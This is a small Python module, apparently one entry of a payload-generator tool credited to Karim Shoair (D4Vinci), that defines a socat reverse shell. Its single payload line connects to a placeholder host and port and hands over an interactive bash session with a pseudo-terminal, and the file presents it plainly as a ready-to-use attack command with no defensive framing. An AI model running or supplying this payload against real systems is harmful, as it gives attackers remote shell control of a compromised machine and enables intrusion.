class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple reverse shell using socat."
    function    = "reverse shell"
    liner       = """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
